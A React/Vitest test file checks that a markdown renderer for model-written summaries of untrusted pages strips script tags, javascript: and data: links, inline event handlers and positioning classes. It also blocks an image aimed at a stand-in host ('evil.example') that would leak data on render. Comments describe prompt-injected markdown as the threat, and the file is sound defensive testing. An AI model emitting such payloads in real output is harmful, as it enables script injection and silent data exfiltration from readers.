import { render, screen } from "@testing-library/react";
import { describe, expect, it } from "vitest";

import catalogService from "@/services/catalog";

import MarkdownRenderer from "./markdown-renderer";

const currentEntry = catalogService
  .listEntriesByCategory("harness")
  .find((entry) => entry.id.endsWith("/tags/report"))!;

function renderMarkdown(source: string) {
  return render(<MarkdownRenderer source={source} entry={currentEntry} />);
}

/**
 * These are not style tests. A summary is written by a model that has just read
 * an untrusted web page, so the sanitiser is the boundary between "the page a
 * stranger wanted us to render" and the workspace. Each case here is a vector
 * that has been used in the wild against markdown-rendering LLM output.
 */
describe("MarkdownRenderer", () => {
  it("escapes a script tag instead of executing it", () => {
    const { container } = renderMarkdown(
      "Before\n\n<script>window.pwned = 1</script>\n\nAfter",
    );
    expect(container.querySelector("script")).toBeNull();
    expect(container.textContent).toContain("Before");
  });

  it("drops a javascript: href", () => {
    const { container } = renderMarkdown("[click me](javascript:alert(1))");
    const link = container.querySelector("a");
    expect(link?.getAttribute("href") ?? "").not.toContain("javascript:");
  });

  it("drops a data: href", () => {
    const { container } = renderMarkdown(
      "[doc](data:text/html;base64,PHNjcmlwdD4=)",
    );
    const link = container.querySelector("a");
    expect(link?.getAttribute("href") ?? "").not.toContain("data:");
  });

  it("renders no image element, so an injected tracking pixel cannot phone home", () => {
    // The vector that needs no JavaScript at all: the request fires on render,
    // leaking the reader's address and whatever the injection encoded in the path.
    const { container } = renderMarkdown(
      "![](https://evil.example/p.png?leak=secret)",
    );
    expect(container.querySelector("img")).toBeNull();
  });

  it("strips an inline event handler written as raw HTML", () => {
    const { container } = renderMarkdown('<div onclick="alert(1)">hello</div>');
    expect(container.querySelector("[onclick]")).toBeNull();
    expect(container.querySelector("div[onclick]")).toBeNull();
  });

  it("keeps an ordinary https link and shows where it goes", () => {
    renderMarkdown("[Supabase docs](https://supabase.com/docs)");
    const link = screen.getByRole("link", { name: /supabase docs/i });
    expect(link).toHaveAttribute("href", "https://supabase.com/docs");
    // Injected markdown loves to label a hostile host with a trusted name.
    expect(link.textContent).toContain("supabase.com");
  });

  it("opens links in a new tab without handing over the opener", () => {
    renderMarkdown("[out](https://example.com/x)");
    const link = screen.getByRole("link", { name: /out/i });
    expect(link).toHaveAttribute("target", "_blank");
    expect(link.getAttribute("rel") ?? "").toContain("noopener");
  });

  it("renders the markdown a summary actually uses", () => {
    renderMarkdown(
      "- First point\n- Second point\n\n**Why it matters:** because.",
    );
    expect(screen.getAllByRole("listitem")).toHaveLength(2);
    expect(screen.getByText("Why it matters:")).toBeInTheDocument();
  });

  it("renders a GitHub-flavored table", () => {
    renderMarkdown("| Model | Price |\n| --- | --- |\n| Haiku | $1 |");
    expect(screen.getByRole("table")).toBeInTheDocument();
    expect(screen.getByRole("cell", { name: "Haiku" })).toBeInTheDocument();
  });

  it("does not let a class attribute through onto rendered content", () => {
    const { container } = renderMarkdown(
      '<p class="fixed inset-0 z-50">covering</p>',
    );
    // The paragraph is escaped to text; nothing gains a positioning class.
    expect(container.querySelector("p.fixed")).toBeNull();
  });

  it("opens a path-shaped code reference as its published Markdown file", () => {
    renderMarkdown(
      "`../../../contributors/synasapmob/contributors/default/libraries/harness/linear/creation-policy.md`",
    );

    const link = screen.getByRole("link", {
      name: "contributors/synasapmob/libraries/harness/linear/creation-policy.md",
    });
    expect(link).toHaveAttribute(
      "href",
      "https://github.com/synasapmob/hub-william/blob/main/contributors/synasapmob/libraries/harness/linear/creation-policy.md",
    );
    expect(link).toHaveAttribute("target", "_blank");
  });

  it("resolves an authored Markdown link from the current document", () => {
    renderMarkdown("[GitHub contract](../github/gh-cli.md)");

    expect(
      screen.getByRole("link", { name: "GitHub contract" }),
    ).toHaveAttribute(
      "href",
      "https://github.com/synasapmob/hub-william/blob/main/contributors/default/libraries/harness/github/gh-cli.md",
    );
  });
});
